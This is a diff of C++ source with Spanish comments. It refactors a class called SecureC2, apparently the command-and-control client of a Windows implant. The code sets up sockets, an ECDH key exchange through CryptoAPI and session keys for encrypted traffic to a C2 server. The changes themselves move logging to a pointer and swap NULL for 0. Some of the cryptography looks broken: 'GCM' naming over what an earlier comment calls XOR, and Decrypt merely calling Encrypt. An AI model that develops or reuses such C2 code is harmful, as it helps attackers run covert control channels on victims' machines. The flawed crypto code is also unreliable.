@@ -458,6 +458,9 @@ public:
 // ============================================================================
 // SECURE C2 - VERSIÓN COMPLETA Y CORREGIDA
 // ============================================================================
+// ============================================================================
+// SECURE C2 - VERSIÓN COMPLETAMENTE CORREGIDA
+// ============================================================================
 class SecureC2 {
 private:
     HCRYPTPROV hProv;
@@ -468,19 +471,10 @@ private:
     bool connected;
     bool useHttps;
     std::mt19937_64 rng;
-    Logger logger;
-    
-    // Funciones de logging internas
-    void Log(const std::string& msg) { 
-        logger.Log(msg); 
-    }
-    
-    void LogError(const std::string& func, DWORD err) { 
-        logger.LogError(func, err); 
-    }
+    Logger* logger;  // <-- CAMBIADO A PUNTERO
     
 public:
-    SecureC2(bool https = false) : sock(INVALID_SOCKET), connected(false), useHttps(https) {
+    SecureC2(bool https = false) : sock(INVALID_SOCKET), connected(false), useHttps(https), logger(nullptr) {
         WSADATA wsa;
         WSAStartup(MAKEWORD(2, 2), &wsa);
         
@@ -502,8 +496,20 @@ public:
         // Generar clave de sesión inicial
         CryptGenRandom(hProv, GCM_256_KEY_SIZE, sessionKey);
         CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
-        
-        Log("SecureC2 inicializado");
+    }
+    
+    // Método para establecer el logger
+    void SetLogger(Logger* log) {
+        logger = log;
+    }
+    
+    // Funciones de logging (ahora con puntero)
+    void Log(const std::string& msg) { 
+        if (logger) logger->Log(msg); 
+    }
+    
+    void LogError(const std::string& func, DWORD err) { 
+        if (logger) logger->LogError(func, err); 
     }
     
     ~SecureC2() {
@@ -511,7 +517,6 @@ public:
         if (hProv) CryptReleaseContext(hProv, 0);
         if (hSessionKey) CryptDestroyKey(hSessionKey);
         WSACleanup();
-        Log("SecureC2 destruido");
     }
     
     bool Connect() {
@@ -552,12 +557,12 @@ public:
         
         // Verificar proveedor
         if (!hProv) {
-            LogError("hProv inválido", 0);
+            if (logger) logger->LogError("hProv inválido", 0);
             return false;
         }
         
         // Generar par de claves ECDH
-        HCRYPTKEY hPrivateKey = NULL;
+        HCRYPTKEY hPrivateKey = 0;  // <-- CAMBIADO DE NULL A 0
         if (!CryptGenKey(hProv, CALG_ECDH_EPHEM, CRYPT_EXPORTABLE, &hPrivateKey)) {
             LogError("CryptGenKey", GetLastError());
             return false;
@@ -566,7 +571,7 @@ public:
         // Exportar a PUBLICKEYBLOB
         BYTE publicKeyBlob[1024] = {0};
         DWORD blobLen = sizeof(publicKeyBlob);
-        if (!CryptExportKey(hPrivateKey, NULL, PUBLICKEYBLOB, 0, publicKeyBlob, &blobLen)) {
+        if (!CryptExportKey(hPrivateKey, 0, PUBLICKEYBLOB, 0, publicKeyBlob, &blobLen)) {  // <-- CAMBIADO NULL A 0
             LogError("CryptExportKey", GetLastError());
             CryptDestroyKey(hPrivateKey);
             return false;
@@ -575,12 +580,10 @@ public:
         Log("Clave pública generada: " + std::to_string(blobLen) + " bytes");
         
         // ===== CONVERSIÓN A DER =====
-        // Preparar estructura CERT_PUBLIC_KEY_INFO
         CERT_PUBLIC_KEY_INFO pubKeyInfo = {0};
         pubKeyInfo.Algorithm.pszObjId = (LPSTR)szOID_ECDH_P256;
         
         // Los datos de la clave están después del header PUBLICKEYBLOB
-        BLOBHEADER* header = (BLOBHEADER*)publicKeyBlob;
         DWORD keyDataOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
         
         pubKeyInfo.PublicKey.cbData = blobLen - keyDataOffset;
@@ -663,9 +666,9 @@ public:
         }
         
         // Importar clave pública del server
-        HCRYPTKEY hServerPublic = NULL;
+        HCRYPTKEY hServerPublic = 0;  // <-- CAMBIADO DE NULL A 0
         if (!CryptImportKey(hProv, serverKeyInfo->PublicKey.pbData,
-                            serverKeyInfo->PublicKey.cbData, NULL, 0, &hServerPublic)) {
+                            serverKeyInfo->PublicKey.cbData, 0, 0, &hServerPublic)) {  // <-- CAMBIADO NULL A 0
             LogError("CryptImportKey (server)", GetLastError());
             LocalFree(serverKeyInfo);
             CryptDestroyKey(hPrivateKey);
@@ -686,7 +689,7 @@ public:
         // Exportar la clave para usarla en cifrado
         BYTE keyBlob[512] = {0};
         DWORD keyBlobLen = sizeof(keyBlob);
-        if (CryptExportKey(hSessionKey, NULL, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobLen)) {
+        if (CryptExportKey(hSessionKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobLen)) {  // <-- CAMBIADO NULL A 0
             DWORD keyOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
             memcpy(sessionKey, keyBlob + keyOffset, GCM_256_KEY_SIZE);
             Log("Clave de sesión generada");
@@ -714,7 +717,7 @@ public:
     
     std::string Decrypt(const std::string& ciphertext) {
         if (!connected) return ciphertext;
-        return Encrypt(ciphertext);  // XOR es reversible
+        return Encrypt(ciphertext);
     }
     
     bool SendRaw(const std::string& data) {
